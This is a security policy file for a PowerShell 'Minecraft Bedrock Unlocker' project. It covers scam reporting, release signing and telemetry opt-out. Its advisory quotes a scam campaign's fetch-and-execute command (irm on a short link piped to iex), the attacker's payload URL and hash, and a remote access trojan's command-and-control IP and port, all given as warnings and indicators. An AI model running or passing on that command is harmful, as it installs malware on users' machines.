# Security Policy

## Reporting a vulnerability or a scam

- **GitHub issues**: https://github.com/CoelhoFZ/MinecraftBedrockUnlocker/issues
- **Discord**: https://discord.gg/byDkXzhvuZ

Please include: the link/domain, a screenshot, the exact PowerShell command you were shown,
and (if available) the SHA256 of the file. Scam reports are taken as seriously as
vulnerabilities - fake "unlocker fix" links put this project's users at risk.

## Known scam campaign (2026-08-11)

Fake "unlocker fix" installers are being distributed in Discord chats:

- Command shown: `irm https://bit.ly/minecraft-fix-bedrock | iex` (with instructions to run
  "PowerShell as admin")
- The short link redirects to
  `https://pub-6cc50c08966e421a99f142d164ba6140.r2.dev/install.ps1`
  (attacker's Cloudflare R2 bucket) - SHA256
  `42cc1d1c60ad69a65640d1180e44130d375d21f5820fa5539c369f5e8629f544`
- The script installs a remote access trojan: Windows service `SentinelCompanyAgent`,
  components `Sentinel.Agent/Controller/Updater`, `SentinelHost.exe`, `SentinelUpdater.exe`,
  `SentinelNative.exe`, mutex `Global\srvhostInstaller`, Defender exclusions for its temp
  folder, and a C2 endpoint at `http://78.154.103.2:9127` (plain HTTP).
- This repository and its official installer are **not** involved. The attacker mimics the
  `irm | iex` install pattern taught in the README.

**Do not run** `irm <anything> | iex` unless the URL literally starts with
`https://github.com/CoelhoFZ/MinecraftBedrockUnlocker`.

## Official sources

| Channel | URL |
|---|---|
| Repository | https://github.com/CoelhoFZ/MinecraftBedrockUnlocker |
| Releases | https://github.com/CoelhoFZ/MinecraftBedrockUnlocker/releases |
| Discord | https://discord.gg/byDkXzhvuZ |

## Supported versions

- **v3.4.0+** bootstraps (`i.ps1`, `install.ps1`) verify the RSA-signed `SHA256SUMS.txt` with
  the embedded public key and abort (fail-closed) if the payload hash does not match. They also
  print the in-band security banner and `Installer verified: official signature OK.`
- Older bootstraps do **not** verify signatures - upgrade to v3.4.0+.
- `bootstrap-v3.2.0.ps1` and `legacy/` are unverified legacy entry points.

## Release signing (for maintainers)

1. Make your changes (typically `unlocker.ps1`).
2. Regenerate the manifest and signature:
   `powershell -ExecutionPolicy Bypass -File scripts\sign-release.ps1 -PrivateKeyFile <key>`
   (or set the `MBU_SIGNING_KEY` env var to the private key path).
3. Commit `SHA256SUMS.txt` + `SHA256SUMS.txt.sig` **together** with the script changes -
   otherwise the fail-closed bootstraps refuse to run until the manifest is re-signed.
4. The private key must **never** be committed. Back it up outside the machine (e.g. a password
   manager). Public key fingerprint (SHA256 of SPKI DER):
   `1f82ea0ba38187e104af956ae94a55386d1e5a9efafc1b0df8ffcfa5c69cc390`
5. To rotate the key: run `scripts\sign-release.ps1 -NewKey`, store the generated private XML
   outside the repo, replace `$mbuPublicKeyXml` in `i.ps1`/`install.ps1`, update the fingerprint
   here, and re-sign the manifest.
## Automatic error reporting (v3.4.2+)

When the installer **fails** (security check failed or download failed), the
bootstrap automatically sends a small **anonymous** diagnostic to the project
maintainer (Cloudflare Worker -> Discord) so issues can be fixed without
requiring a screenshot from the user.

Only technical data is sent - **never** your username, machine name, IP or file
paths. The payload is: MBU version, Windows/PowerShell version, the failure
stage and the file sizes/hashes from the check.

- **Opt out:** set the environment variable `MBU_NO_TELEMETRY=1` before running.
- **Advanced:** `MBU_BASE_URL` overrides the download base (mirrors/tests).
  The RSA signature check remains the security boundary, so a custom base is safe.
